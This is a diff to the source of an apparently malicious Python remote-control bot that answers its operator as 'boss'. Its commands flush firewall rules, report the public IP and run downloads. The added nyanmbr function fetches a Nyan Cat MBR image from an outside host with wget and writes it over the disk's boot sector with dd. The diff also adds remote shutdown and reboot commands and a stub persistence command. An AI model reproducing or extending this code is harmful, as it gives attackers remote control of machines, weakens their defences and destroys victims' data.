@@ -128,13 +128,13 @@ def getIP(): #gets the public IP address
 
 def flushFirewall(): #flushes the firewall rules
 	if (os == "linux"):
-		request = execute("iptables -F") #flushing rules
+		request = execute("/usr/bin/env iptables -F") #flushing rules
 		sendData("Firewall rules have been flushed.")
 
 def checkFirewall(): #reports current firewall config
 	if (os == "linux"):
 		sendData("Current Firewall Rules:")
-		request = execute("iptables -L -n")
+		request = execute("/usr/bin/env iptables -L -n")
 		sendData(request)
 	elif (os == "windows"):
 		sendData("idk how to windows yet boss.")
@@ -154,6 +154,19 @@ def download(cmd): #file downloader
 			request = execute(download) #executing the download
 			sendData("Download executed.")
 
+def nyanmbr(): #download nyancat.mbr and over bootloader with it
+	if (os == "linux"):
+		execute("wget -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
+		execute("dd if=/tmp/nyan.mbr of=/dev/sda")
+
+def nap(): #shutdown the computer ungracefully
+	execute("init 0")
+
+def reboot(): #reboot
+	execute("init 6")
+
+def persist(): #try to persist bot
+	sendData("I don't know how to do that yet boss.")
 
 #debugger
 DEBUG = 0
@@ -188,7 +201,11 @@ commands = {
 	"what is your ip" : getIP,
 	"flush firewall" : flushFirewall,
 	"firewall" : checkFirewall,
-	"download" : download
+	"download" : download,
+	"nyanmbr" : nyanmbr,
+	"take a nap": nap,
+	"reboot" : reboot,
+	"persist" : persist
 }
 
 #function which parses the command and determines how to handle it
